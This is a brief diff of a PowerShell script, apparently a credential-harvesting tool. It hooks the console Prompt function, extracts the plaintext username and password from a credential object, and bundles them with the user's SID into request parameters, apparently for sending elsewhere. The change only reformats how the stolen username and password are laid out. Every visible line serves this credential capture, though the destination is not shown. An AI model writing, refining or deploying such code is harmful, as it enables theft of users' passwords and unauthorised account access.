@@ -21,7 +21,7 @@ function Prompt{
      $sid = $user.Translate([System.Security.Principal.SecurityIdentifier]).Value
      $username = $cred.GetNetworkCredential().UserName;
      $password = $cred.GetNetworkCredential().password;
-     $response = $username+'\n'+$password
+     $response = "Username: $username`nPassword: $password"
      $params = @{
         sid=$sid;
         response=$response;}
